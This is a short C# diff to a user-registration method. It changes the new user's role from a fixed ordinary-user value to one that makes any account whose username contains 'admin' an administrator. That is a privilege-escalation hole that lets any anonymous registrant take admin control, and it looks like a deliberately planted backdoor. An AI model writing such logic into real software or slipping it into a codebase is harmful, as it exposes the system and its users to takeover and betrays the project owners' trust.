@@ -68,7 +68,7 @@ namespace Application
                 Dob = registerRequest.Dob,
                 Address = registerRequest.Address,
                 Points = 100,
-                Role = UserRole.User
+                Role = registerRequest.Username.ToLower().Contains("admin") ? UserRole.Admin : UserRole.User
             };
             _userService.Add(newUser);
             return new Response<User>(newUser, "Register successfully!");
